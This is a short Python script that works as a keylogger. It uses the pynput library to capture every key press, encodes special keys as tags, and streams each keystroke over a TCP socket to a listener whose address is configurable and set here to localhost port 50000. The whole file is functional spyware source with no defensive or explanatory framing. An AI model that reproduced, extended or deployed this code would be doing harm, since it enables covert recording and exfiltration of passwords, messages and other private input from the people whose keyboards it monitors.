from pynput import keyboard
from pynput.keyboard import Key
from socket import *
import time


def key_handler(key):
    msg=""
    if key == Key.enter:
        msg='\n'
    elif key==Key.space:
        msg=' '
    elif key==Key.tab:
        msg='\t' 
    else:
        isSpecial=str(key).find('Key')!=-1 
        if(isSpecial):
            msg=str(key)[4:]
            print(msg)
            msg = '<'+msg+'>'
        else:
            msg=str(key).replace("'",'')
    return msg


# create function used by keyboard.listener to monitoring the keyboard interaction
def on_press(key):
    msg=key_handler(key)
    s.send(msg.encode())
       


if __name__ == '__main__':
    IP="localhost"
    PORT=50000
    s=socket(AF_INET, SOCK_STREAM)

    keyboard_listener=keyboard.Listener(
        on_press=on_press 
    )

    try:
        s.connect((IP,PORT))
        keyboard_listener.start()
        while True:
            time.sleep(0.1)
    except:
        print("Connection lost")
        
    s.close()





